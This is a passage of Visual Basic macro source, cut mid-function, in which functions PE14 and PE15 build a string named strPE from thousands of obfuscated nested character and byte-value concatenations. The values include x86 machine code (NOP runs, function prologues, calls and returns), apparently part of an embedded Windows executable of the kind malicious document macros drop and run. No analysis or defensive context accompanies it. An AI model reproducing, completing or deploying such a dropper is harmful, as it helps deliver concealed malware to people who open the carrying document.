    strPE = A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(strPE, 239), 135), "@?"), 246), 135), "'"), 230), 253), 135), "@"), 0), 4), 136), "@"), 0), 11), 136), "@"), 0), 18), 136), "@"), 0), "=`@"), 0), 25), "O"), 193), 0), "'"), 136), "@"), 0), "X"), 222), "@"), 0), 252), 157), "@"), 0), " "), 136), "@"), 0), "5"), 205)
    strPE = A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "@"), 0), 250), 136), 191), 0), "C"), 136), "@"), 0), 25), 136), "@"), 143), 253), "(@"), 0), "Xr@"), 0), 252), 150), "@O_L@"), 0), 133), 136), "@"), 0), "x"), 136), "@"), 0), 147), 136), 238), 0), 154), 136), "@"), 0), 22), 201), "@"), 0)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 168), 136), "@"), 0), 175), 136), 242), 0), 252), 163), "@"), 0), 252), 136), 254), 0), 226), 136), "@"), 0), 1), 136), "@"), 0), 189), 170), 235), 180), 196), 136), 250), 0), 203), 136), "Q"), 0), 252), 255), "@"), 0), 252), 136), "@"), 0), 252), 136), "@"), 0), 243), "&")
    strPE = B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(strPE, "@"), 0), 217), 136), 154), 0), "b"), 136), "@"), 0), 231), 136), 255), "?"), 238), "b@"), 0), 245), 136), "@"), 0), 144), 144), 144), 144), 144), 144), 20), 144), "U"), 143), 7), "S"), 139), "]"), 6), "V"), 139), "u"), 8), "W"), 139), "}"), 16), "j EVh")
    strPE = B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(strPE, 0), "^"), 0), 0), "W"), 221), 0), 166), 0), 18), 0), 0), 255), 21), "0"), 192), "@"), 0), 133), 192), "uDa"), 13), 34), 195), "@"), 0), 133), 201), "*}9<"), 197), 24), 195), "@Nt"), 14), 139), "P"), 197), 142), 195), "@"), 0), "<O")
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(strPE, 201), "u"), 235), 153), "D"), 142), 4), 197), 28), 195), "@"), 0), "SP"), 18), 232), "&"), 27), "~"), 0), 139), 254), 202), 201), "q3"), 192), 242), "u"), 247), 209), "I"), 139), 193), "t"), 34), 133), 192), "t1"), 173), "L0"), 255), "H"), 128), 249), 13), "t"), 165)
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 128), 249), 10), "u~"), 198), 4), "0p"), 247), "=u"), 233), 139), 206), "_^[]"), 195), 139), "}"), 16), "W"), 215), 137), 0), "A"), 27), 31), "V"), 232), 20), 252), 255), 255), 131), 196), 16), 209), 198), "_^[l"), 195), 144), 144), 14), 144)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 181), 139), 236), 139), "E"), 8), "P"), 255), 147), 20), 193), "@"), 0), 131), 196), 4), 133), 192), "t"), 19), 139), "M"), 16), 139), "U"), 12), "PQR"), 232), 222), 252), 255), 255), 236), 16), 12), "]"), 195), 139), "E"), 16), 139), "a")
    strPE = B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 12), "hT"), 249), 240), 196), "PQ"), 23), 199), "U"), 255), 255), 131), 238), 219), "]"), 183), 144), 144), "U"), 139), 236), 131), 236), 12), 139), "m"), 12), "U"), 139), "u"), 16), 154), "M"), 248), ">M"), 8), "j"), 0), 139), 6), "j"), 0), 141), "b"), 252), 137), "E")
    strPE = A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 244), "j"), 0), "R"), 139), "Q"), 4), 165), "E"), 244), 219), 1), "PR"), 199), "Q"), 252), 199), 0), 0), 0), 255), 21), 152), 193), "@"), 0), 131), 248), 255), 154), ","), 147), 139), "="), 216), 193), "@"), 0), 255), 18), 133), 192), "u"), 10), 137), 6), "_^"), 139)
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 229), "]"), 194), 144), 0), 255), 255), 199), "7"), 0), 0), "R"), 0), "_"), 5), 128), 129), 10), 0), "^"), 139), 229), "]"), 194), 12), 0), 139), "E"), 252), 137), 6), 13), "f^"), 139), 229), 9), 194), 144), 0), 144), 163), 144), 144), 144), 187), 144), 144), "<"), 139)
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(strPE, 236), 15), 236), 16), 216), "M"), 211), "V"), 139), "u"), 16), "jv"), 141), "U"), 248), "j"), 0), 139), 6), "R"), 139), "U"), 8), 137), "E"), 240), 141), 200), 252), 137), "M"), 244), 211), 139), "B"), 4), 141), "M`j"), 1), "QP"), 199), "E>"), 0), 0), 0)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(strPE, 0), 199), "E"), 191), 0), "o"), 0), 0), 255), 169), 148), 193), "@S"), 131), 248), 255), "u,W"), 139), "h"), 216), "<@"), 0), 255), 215), 133), "_u"), 10), 137), "X_^"), 139), 229), 160), 244), 12), 0), 255), 215), 199), 6), 220), "S"), 0), "&")
    strPE = A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 246), 5), 128), "u"), 10), "(^"), 139), 229), "]"), 164), 31), 0), 139), "E"), 252), 137), 6), 172), 247), 218), 27), 192), "%"), 198), 238), 254), 255), 5), "~"), 17), 1), "X"), 139), "<]"), 194), 12), 0), 144), 144), 144), "U"), 139), 236), "Q"), 139), "M"), 8), 141)
    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 159), 252), "Ph~f"), 4), 128), 252), 172), "E"), 252), 0), 0), 0), 0), 255), 21), 180), 193), "@"), 0), 131), 169), 255), "u"), 30), 178), 139), "5"), 216), 143), "@"), 0), 255), 252), 186), 192), "u"), 177), "^"), 253), 229), "]"), 195), 211), "j"), 5), 128), 252)
    strPE = A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(strPE, 10), 0), "^"), 139), 229), "]"), 195), "3"), 192), 139), 229), "]"), 195), 144), 144), 144), 144), 144), 144), 144), "i"), 144), "U"), 139), "s_9"), 218), 248), 141), "E"), 252), "P"), 16), "~f"), 4), 128), "Q"), 199), 162), 252), 1), 0), 27), 0), 255), 21), 199), 193)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(strPE, "@"), 0), 131), 248), ">H"), 30), 18), 202), "5"), 216), 193), "@"), 0), 255), 214), 133), 250), "u"), 5), "^"), 139), 229), "]"), 195), 255), "<"), 5), 128), "N"), 10), 171), "^"), 139), 229), "]"), 195), "4"), 192), 139), 229), "]"), 128), 144), 144), 144), 187), 144), 175), 144)
    strPE = A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(B(strPE, ";"), 144), "U"), 139), 236), "Sj"), 166), 12), "V"), 139), "u"), 8), "W"), 139), "}"), 16), "O"), 195), 11), 199), "r"), 193), 139), 185), "/["), 255), "$."), 200), 217), 14), 10), 1), 0), 198), 139), "V"), 4), "R"), 144), 132), 255), 255), "Q"), 131), 162), 4), 130)
    strPE = A(A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 192), 15), 132), 246), 239), 173), 0), 20), "^[R"), 127), 12), 0), "h"), 255), 15), 140), 241), 176), "0"), 0), 127), 8), 231), 219), "n"), 134), 135), 0), 0), 0), 139), 172), " "), 139), "N$"), 11), 193), "u"), 176), 139), "N"), 4), "Q"), 232), 253), 254), 165)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 255), 131), 3), 4), 186), 192), 15), 133), 255), 0), 0), 0), 139), "V^;"), 211), "u"), 11), 139), "F$;"), 199), 15), 132), 173), 0), 0), 0), 153), "M"), 16), "j"), 0), "h"), 232), 3), 0), 0), "QS"), 141), "~"), 24), 232), 140), "("), 0), 0)
    strPE = A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(strPE, 139), "Vs="), 29), "?"), 16), "@"), 24), 13), 4), 154), "h"), 27), 16), 0), 0), "h"), 255), 255), 0), 0), "R"), 137), "s"), 187), 211), 139), "Fsj"), 4), "Wh"), 5), 16), 0), 0), "h%"), 255), "W"), 0), "P"), 255), 211), " }2"), 139)
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(strPE, 163), 222), 137), "~$"), 137), "^ _^3"), 192), "[]"), 194), 12), "a"), 149), 255), 127), "R|"), 4), 225), 219), "sL"), 139), "N"), 4), 7), "E"), 8), 0), 0), 215), 0), "Q"), 232), 199), 254), 255), 255), 131), 196), 4), 133), 192), "u=")
    strPE = A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(strPE, 139), "F"), 4), 139), "="), 184), 193), "@"), 231), 141), "U"), 8), "jTRh"), 6), 16), 0), 0), 231), 255), 255), 0), 0), "P"), 255), 140), 139), "V"), 4), "BM"), 8), "j"), 4), "Qho"), 16), 0), 0), "/"), 129), 255), 0), 0), "R"), 255), 215)
    strPE = A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(strPE, "5}Y"), 137), "^ "), 137), "~$3"), 27), "_^[]"), 194), 1), 0), 144), 144), 144), 144), "U"), 139), 236), "Q"), 139), " "), 16), "3"), 201), 133), 192), 15), 149), "E"), 137), "M"), 252), 139), "Mq"), 131), 249), "@V"), 15), 143), "5"), 2)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 0), 31), "Z"), 132), 7), 2), 249), 0), "I"), 131), 137), 15), 15), "p"), 0), 3), 0), 0), "3"), 210), 138), 145), 16), "`@"), 0), 255), "$"), 149), 248), 144), 135), 0), 139), "dlg"), 210), "S"), 243), "8"), 131), 225), 2), 128), 137), 2), 153), 148), 194)
    strPE = B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(strPE, ";"), 194), "t/"), 139), "N"), 4), 141), "E"), 252), 193), 4), 189), "j"), 134), "h"), 255), 255), 197), 0), "Q"), 255), 160), 184), 193), "@"), 0), 131), 248), 255), "q"), 132), "D"), 2), 191), 0), 139), "E"), 23), 133), "v"), 132), "F8t"), 14), 12), 2), 137), "F")
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "U3"), 192), "^"), 250), 22), "]"), 194), 12), 0), "$"), 253), 137), "-83"), 192), "^"), 139), 14), "]"), 156), 229), 0), 139), 191), 8), "p"), 201), "dVc"), 131), 226), 4), 128), 250), 4), 15), 148), 193), 129), 127), "t"), 212), 139), 225), 4), 141), "U")
    strPE = A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(strPE, 147), "j"), 4), "Rj"), 1), "h"), 255), 255), 0), 0), "P"), 255), 21), 184), "s@"), 0), 131), 248), 171), 15), 132), 232), 1), 0), 0), "6E"), 160), 133), 192), 139), "F8t"), 128), 191), 4), 137), "F"), 144), "3"), 192), "^"), 139), 229), "]"), 194), 12)
    strPE = B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(strPE, 0), "$"), 251), 137), 145), "830^"), 139), 229), "]"), 194), 12), 0), 214), 219), 8), 229), 210), 139), "N8"), 11), 225), 16), 128), 249), 16), 15), 148), 187), ";"), 194), "fZu"), 255), 148), 255), 139), "N"), 4), 141), "E{j"), 4), "Pj")
    strPE = B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 34), "h"), 219), 255), 0), 0), "Q"), 239), 244), 184), 193), "@n"), 131), 248), 255), 254), 132), "O"), 1), 0), "c?E"), 164), 133), 192), 139), "Fnt"), 169), 12), 16), 137), "F83"), 192), "^"), 139), 187), "]"), 194), 12), 0), "$"), 239), "WF")
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 208), 20), 192), "^"), 139), 229), "]"), 134), 12), 0), 139), 151), 8), "3"), 185), 139), "V8"), 131), 226), 151), "("), 250), 8), 15), 148), 143), ";"), 132), "E"), 132), 22), 255), "?"), 255), "`"), 192), "!"), 246), 139), "V"), 4), "R"), 232), 131), 188), 214), 255), 212), 196)
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 4), "s"), 192), "t"), 10), 142), 193), 229), "]"), 194), 12), 0), 139), "F"), 4), 219), 232), 145), 252), 255), 255), "o"), 196), 4), 16), 192), 15), 175), 165), 1), 0), 0), 11), "i"), 16), 133), 141), 139), 195), "8"), 248), 14), 12), 8), 137), "F83"), 192), "^")
    strPE = B(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 139), 197), "]Z"), 12), 147), "$"), 20), 137), "F83"), 192), "^"), 139), 229), 232), 194), 12), 0), 191), "u"), 8), 129), "N8"), 131), 18), 1), 254), "L"), 244), "w"), 27), 201), "A;"), 173), 15), 132), 34), "&"), 255), 255), 141), "U)j"), 4), "f")

    PE14 = strPE
End Function

Private Function PE15() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(strPE, "^E"), 8), 139), "\"), 4), "Rh"), 128), 165), 0), 0), "h"), 255), 255), 207), 0), "Rf"), 199), "E"), 10), 30), 0), 255), ")"), 184), 193), "T("), 26), 248), "N"), 15), 132), 176), 0), 0), 0), 160), "E"), 16), 133), 192), "oF"), 183), 151), 14), 12)
    strPE = B(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "m"), 137), 158), "8"), 193), 192), "^O"), 229), "]"), 194), 12), 0), "$"), 254), 137), 226), "83"), 192), "^"), 139), 229), "]"), 194), 12), 0), 139), "U"), 8), 141), "M"), 16), "j"), 4), 255), 139), "B"), 4), "A"), 1), 16), "r"), 0), "h2"), 153), 0), 0), "P")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(strPE, 255), 222), 184), 193), "@"), 0), 131), 248), "2!"), 133), "0"), 254), "["), 255), 235), "@"), 129), 155), 0), "@"), 0), 163), 15), 143), 199), 0), 0), 0), 15), 132), 213), 0), 0), 220), 156), 249), 128), 0), 0), 0), 15), 132), 141), 0), 250), 0), 129), 249), 0)
    strPE = B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 2), 0), "l\"), 133), 177), 31), 0), 0), 139), "u 3"), 210), 139), "N8"), 129), 225), 0), 2), 0), 242), 219), 249), 0), 2), 187), 19), 15), 148), 194), ";"), 208), 15), 132), 244), 253), 255), 247), "=N"), 4), "kE"), 16), "j"), 4), "Pj")
    strPE = B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(strPE, 1), "j"), 6), "Q"), 255), 21), 184), 193), "@"), 0), 131), 248), 148), "u!"), 139), "5"), 216), 193), "@"), 0), 4), 214), 192), 192), "u"), 152), "^"), 139), 229), "]"), 194), 12), 0), 255), 214), 231), 238), 252), 10), 0), "^"), 139), 251), "]"), 194), 12), 0), 139), "E")
    strPE = B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(strPE, 16), 133), 192), 139), "F8t"), 15), "("), 204), 2), 137), 240), "8"), 12), 192), 140), 249), 229), "]"), 194), 12), 0), 128), 228), 253), 137), "FN3"), 192), "^"), 139), 229), "]"), 194), 12), 0), 162), "E"), 8), 141), "U"), 16), "j"), 4), "R6HS")
    strPE = A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "h"), 2), 16), 0), 0), "h"), 255), 255), 0), 0), "Q"), 255), 21), 184), 193), 177), 0), 131), 248), 255), 15), 133), "]"), 253), 244), 255), 235), 142), 129), 249), "}"), 222), "q"), 0), "t"), 222), "n"), 167), 0), 0), 135), "^"), 139), 229), "]"), 194), 12), "%"), 184), 135)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(strPE, 134), 1), 0), "^"), 201), 25), 255), 194), 12), 0), 245), "6p"), 143), 187), 0), 237), "i"), 12), 0), 179), 180), "@"), 0), 2), 143), "@"), 0), 163), 142), "@"), 0), 222), 135), 27), 0), 0), 1), 5), "p"), 5), "s"), 5), 3), 5), 5), 5), "E"), 5), 5)
    strPE = A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 5), 4), "U~"), 236), 131), 236), ","), 139), 150), 16), 139), "M"), 12), 244), "WP"), 141), "U"), 212), "Q"), 159), 188), 215), 217), 255), 255), 190), "E"), 240), 139), "M"), 8), "w"), 190), 129), "|"), 0), "D{"), 20), "e"), 196), 196), "@"), 0), 141), 4), 133), 216)
    strPE = A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(strPE, 196), "@"), 0), 136), "Q"), 255), "@A"), 138), 16), 136), "Q"), 255), 182), "@"), 1), 139), "U"), 232), 136), 1), "A"), 141), 4), 149), 168), 196), 9), 0), 198), 1), 178), "A"), 138), 16), 146), 17), 138), "P7A@"), 136), 17), 138), "@"), 200), "A"), 136), 1)
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(strPE, 139), "E"), 228), 153), 247), 254), "A"), 198), 1), 15), "A"), 4), "0"), 128), 194), "0"), 136), 214), 139), "E"), 224), ">"), 136), 17), "A"), 153), 247), 254), 198), 1), " A"), 4), "0"), 22), "T0"), 136), 1), 139), "E"), 220), ","), 136), 17), "A"), 153), 142), 254), 198)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(strPE, 1), ":A"), 26), ">"), 128), ":0"), 136), 182), "DE"), 216), 225), 136), 17), "A"), 153), 247), 254), 198), 1), ":A"), 4), "0"), 128), 194), "0"), 221), 1), "A"), 136), 17), 169), 139), "U"), 169), 191), "@"), 3), 0), 186), 225), 1), " A"), 193), 178), "l")
    strPE = B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 7), 0), 0), 139), 198), 153), 247), 255), 191), 215), 0), 0), 253), 4), "0"), 136), 1), 184), 31), 1), 235), "Q"), 247), 234), 193), 250), 5), 139), 194), "A"), 193), 232), 31), 3), 208), 139), 198), 128), 194), "0"), 136), 17), "m"), 153), 247), 255), 4), "g"), 194), "f")
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(strPE, "f_"), 247), "("), 193), 250), 2), 25), 194), 193), 232), 31), "{"), 208), 139), 203), 128), 194), "0"), 190), 181), 0), 0), 27), 136), 12), "A"), 153), 210), 254), 252), 128), 194), 139), 31), "I"), 136), 17), 198), "-"), 1), 0), 2), "0]L"), 12), 135), 144), 144)
    strPE = A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 15), 180), 236), "S"), 139), 255), 16), "V"), 250), 139), 251), 131), 201), 255), "3"), 192), 139), "u"), 8), 242), 174), 247), 209), 129), 246), "b"), 0), 0), 250), 137), "M"), 16), "vk"), 138), "S"), 196), 128), 27), ":u%"), 138), 133)
    strPE = A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(strPE, 2), "</t"), 4), "s"), 146), "u"), 167), "h"), 224), 0), 11), 0), 29), 213), 21), 16), 193), "@X"), 139), "E"), 12), 131), 196), 8), 131), 232), 4), 251), 198), 8), 235), ";"), 208), 3), "</"), 1), 4), "<\"), 176), "4"), 128), 250), "/t"), 5)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(strPE, 128), 250), "\u*"), 128), "{"), 2), "?t$"), 131), 233), "Zh"), 204), 25), "A"), 0), 150), 131), 195), 2), 137), "M"), 16), 255), 21), 16), 195), ","), 0), 139), "E"), 12), 23), 196), 8), 131), 232), 8), 131), 198), 16), 137), "E"), 12), 141), 178), 12)
    strPE = A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(strPE, 141), 165), 16), "lVQS"), 232), 180), 22), 0), 0), 133), 192), "t"), 188), "6x"), 17), 1), 0), "u<_"), 148), 184), 22), 0), 0), "y[]"), 195), 139), "E"), 16), 0), 192), "t"), 10), "_^"), 184), "&"), 0), 0), "?[]"), 195)
    strPE = B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(strPE, "f"), 139), 6), "f"), 133), 192), "t"), 23), 175), "=/"), 0), "f"), 5), 196), "P"), 6), 183), 0), 150), 139), "F"), 2), 245), "t"), 2), "f"), 133), 192), "u"), 233), "3"), 192), 201), "^"), 148), "]"), 195), 226), 144), 144), 144), 144), 144), 144), 144), "U"), 139), 236), "V")
    strPE = A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 139), "u"), 8), "W3"), 255), 131), "\"), 4), 255), 15), 132), 132), 0), 0), "S"), 138), 186), ","), 132), 237), "t"), 8), "V"), 232), "o"), 31), "q"), 0), 139), 248), "5"), 25), 24), "%"), 0), 0), "D"), 6), 148), "Z="), 21), 0), 236), 6), "u"), 23), 213), 2)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(strPE, "."), 21), 8), 193), "@"), 0), 131), 196), 4), "j"), 255), "a"), 244), 204), 21), 164), 192), "@"), 0), 235), 247), "="), 0), 0), 7), 4), "u"), 23), "j"), 1), "C"), 21), "O"), 193), "@"), 0), 216), 196), 4), "j"), 255), "j"), 245), 10), 21), 164), 192), "@"), 0), 235)
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(strPE, "(="), 0), 0), 0), 2), "u!j"), 0), 255), 232), 8), "|@"), 0), 131), 196), 246), "j"), 255), "j"), 246), 255), 21), 164), 192), "@"), 0), 235), "c"), 139), "a"), 4), 179), 255), 21), 163), 192), "@"), 0), 199), "F"), 4), 255), 255), 255), 255), 139), "F")
    strPE = A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 154), 133), 192), "'"), 21), 139), "@"), 16), 152), 137), "t"), 14), "P"), 255), 21), "t"), 192), 202), 0), 199), "F"), 12), 0), 0), 201), 0), 139), 199), "_"), 227), "]"), 195), 144), 144), 144), 144), 144), "[U"), 139), 236), 184), "^@"), 0), 0), 232), "3$"), 0)
    strPE = B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(strPE, 0), "S"), 139), "]WV93"), 255), 250), "E"), 248), 157), 0), 0), 0), 246), 195), 1), 137), "}"), 252), "t"), 7), "@E"), 252), 0), 0), 0), 128), 246), 195), 2), "t"), 7), 129), 242), 252), 0), "z"), 9), "@"), 247), 195), 22), 187), 0), 246), "y")
    strPE = A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(strPE, "-"), 139), "E"), 161), "A"), 247), 1), 137), "E"), 252), 139), "g"), 220), 8), "A"), 0), 250), 249), 30), "|"), 7), 199), "E"), 248), 7), 0), 21), 0), 139), 195), 131), 224), 4), "t"), 29), 13), 195), "@t"), 166), 190), "V"), 0), "3"), 0), "1"), 34), 138), 211), 128)
